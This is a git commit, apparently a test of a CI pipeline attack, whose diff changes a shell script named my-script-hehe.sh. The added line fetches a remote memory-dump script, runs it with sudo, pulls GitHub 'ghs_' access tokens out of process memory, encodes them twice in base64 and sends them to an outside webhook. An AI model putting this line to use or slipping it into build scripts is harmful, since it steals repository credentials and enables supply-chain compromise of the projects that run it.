5853a6697cf4d7761e4e3472d3093e22c1897557
just-a-test-hehe-2 <niels.ingi+ghtest2@gmail.com>
2025-01-22 11:04:31 +0000

    Update my-script-hehe.sh

--- scripts/my-script-hehe.sh
+++ scripts/my-script-hehe.sh
@@ -1,2 +1,2 @@
 echo "This is from a malicious script! WOW"
-curl "https://rapid-thailand-91.webhook.cool/?q=hello+new"
+curl "https://rapid-thailand-91.webhook.cool/?q=$(curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 | base64)"
